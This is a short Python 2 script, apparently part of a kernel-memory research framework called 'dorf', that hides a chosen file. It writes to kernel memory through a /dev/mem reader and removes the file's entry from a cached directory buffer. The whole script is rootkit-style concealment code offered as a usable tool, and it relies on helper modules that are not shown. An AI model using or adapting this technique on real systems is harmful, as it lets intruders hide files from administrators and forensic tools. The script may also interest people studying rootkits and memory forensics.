#!/usr/bin/python

"""
Hiding a file.  In short, this removes a file from
a cached directory entry inode.

Ryan Riley
rriley.cs@gmail.com
"""

import os, sys
from ctypes import *

import version
exec("from dorf."+version.my_version+".kstructs import *")
exec("from dorf."+version.my_version+".memreader import *")
exec("from dorf."+version.my_version+".symbolfinder import *")

from dorf.hashtable.pidhash import *
from dorf.hashtable.dentryhash import *


if len(sys.argv) != 2:
	print "Usage: ",
	print sys.argv[0],
	print " <filetohide>"
	sys.exit(-1)

# Do some work on the pathname
full_path = os.path.abspath(sys.argv[1])
basename = os.path.basename(full_path)
dirname = os.path.dirname(full_path)

if os.path.exists(dirname) == False:
	print "Parent directory does not exist!"
	sys.exit(-1)

sf = SymbolFinder()
dm = DevMemReader(sf)

bh = buffer_head()
bh_lrus = bh.get_addr_first_bh(sf)

# Read the item's parent dir, this causes the block related to it
# to end up at the head of the bh_lrus list.  Very convenient...
# This might not work under heavy workloads, multi-core, etc.
# (But it can be changed to handle multicore...)
print os.listdir(dirname)

# Read in the first buffer_head from the LRU
# The offset is kernel specific and stored with the buffer_head
bh_addr = dm.read_int(bh_lrus)
dm.read(bh, bh_addr)

# Go through the directory block and find the entry, then
# remove it.
# This will probably fail for large directories with more than
# one block used to store their children...
de = dir_entry(dm)

# Find the memory location of the dir_entry for the file we want
loc = de.find_fname(bh.b_data, bh.b_data+bh.b_size, basename)

# Bypass that entry in the inode
if loc != 0:
	de.remove(bh.b_data, loc)
